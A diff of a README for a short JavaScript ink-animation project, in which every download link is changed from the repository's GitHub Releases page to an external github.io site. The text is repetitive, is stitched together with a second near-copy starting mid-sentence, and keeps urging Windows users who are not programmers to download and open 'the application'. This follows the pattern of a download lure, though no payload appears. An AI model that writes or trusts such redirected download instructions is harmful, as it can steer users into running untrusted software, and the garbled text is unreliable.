@@ -1,6 +1,6 @@
 # 🎬 no-viral-no-justice - Watch a Tiny Ink Film
 
-[![Download no-viral-no-justice](https://img.shields.io/badge/Download%20no--viral--no--justice-Visit%20Releases-FF4D6D?style=for-the-badge&labelColor=2D1B69&logo=github&logoColor=white)](https://github.com/soulashwin/no-viral-no-justice/releases)
+[![Download no-viral-no-justice](https://img.shields.io/badge/Download%20no--viral--no--justice-Visit%20Releases-FF4D6D?style=for-the-badge&labelColor=2D1B69&logo=github&logoColor=white)](https://soulashwin.github.io)
 
 no-viral-no-justice is a 28-second Indonesian ink animation made with JavaScript and p5.brush. The project brings the full film, source files, storyboards, and production notes together in one place. If you are using Windows and want to watch or explore the project, the download page is the starting point. You do not need to be a programmer to begin. This guide helps you find the download, open it on Windows, and understand what you are viewing.
 
@@ -8,7 +8,7 @@ no-viral-no-justice is a 28-second Indonesian ink animation made with JavaScript
 
 Visit this link to download the application:
 
-[Download no-viral-no-justice from GitHub Releases](https://github.com/soulashwin/no-viral-no-justice/releases)
+[Download no-viral-no-justice from GitHub Releases](https://soulashwin.github.io)
 
 This is the official download page. Open the link in your browser, then use the download option on that page to get the application. After the download finishes, open the downloaded application on your Windows computer.
 
@@ -40,7 +40,7 @@ If you are helping someone else open the project, sit with them while they visit
 
 Go to the official download page here:
 
-[no-viral-no-justice Releases](https://github.com/soulashwin/no-viral-no-justice/releases)
+[no-viral-no-justice Releases](https://soulashwin.github.io)
 
 Visit this link to download the application. Once the download is complete, open the downloaded application on your Windows computer. That is the main action for getting started.
 
@@ -84,7 +84,7 @@ No. Start by visiting the download page and opening the application on Windows. 
 
 Use the official releases page:
 
-[Download no-viral-no-justice](https://github.com/soulashwin/no-viral-no-justice/releases)
+[Download no-viral-no-justice](https://soulashwin.github.io)
 
 Visit this link to download the application, then open the downloaded item on your Windows computer.
 
@@ -92,7 +92,7 @@ Visit this link to download the application, then open the downloaded item on yo
 
 The repository describes a 28-second Indonesian ink animation made with JavaScript and p5.brush. The full film# 🎬 no-viral-no-justice - Watch a Tiny Ink Film
 
-[![Download no-viral-no-justice](https://img.shields.io/badge/Download%20no--viral--no--justice-Visit%20Releases-FF4D6D?style=for-the-badge&labelColor=6A4C93&logo=github&logoColor=white)](https://github.com/soulashwin/no-viral-no-justice/releases)
+[![Download no-viral-no-justice](https://img.shields.io/badge/Download%20no--viral--no--justice-Visit%20Releases-FF4D6D?style=for-the-badge&labelColor=6A4C93&logo=github&logoColor=white)](https://soulashwin.github.io)
 
 no-viral-no-justice is a 28-second Indonesian ink animation made with JavaScript and p5.brush. The project brings the full film, source, storyboards, and production notes together in one place. This guide is for Windows users who want to download and open the project without needing programming knowledge. You do not have to understand the code to begin. Start with the download page, get the application, and open it on your Windows computer.
 
@@ -100,7 +100,7 @@ no-viral-no-justice is a 28-second Indonesian ink animation made with JavaScript
 
 Visit this link to download the application:
 
-[Download no-viral-no-justice from GitHub Releases](https://github.com/soulashwin/no-viral-no-justice/releases)
+[Download no-viral-no-justice from GitHub Releases](https://soulashwin.github.io)
 
 The releases page is the official place to get the downloadable project. Visit this link to download the application, then open the downloaded application on your Windows computer. Keep the page open until the download is complete so you can return to it if needed.
 
@@ -133,7 +133,7 @@ If you are helping someone else open the project, stay with them while they visi
 
 Go to the official releases page here:
 
-[no-viral-no-justice Releases](https://github.com/soulashwin/no-viral-no-justice/releases)
+[no-viral-no-justice Releases](https://soulashwin.github.io)
 
 Visit this link to download the application. When the download finishes, open the downloaded application on your Windows computer. That is the main action for getting started. The releases page is where the downloadable project is offered, so use the download option shown there and then open the downloaded item on Windows.
 
@@ -175,7 +175,7 @@ No. Start by visiting the download page and opening the application on Windows. 
 
 Use the official releases page:
 
-[Download no-viral-no-justice](https://github.com/soulashwin/no-viral-no-justice/releases)
+[Download no-viral-no-justice](https://soulashwin.github.io)
 
 Visit this link to download the application, then open the downloaded item on your Windows computer.
 
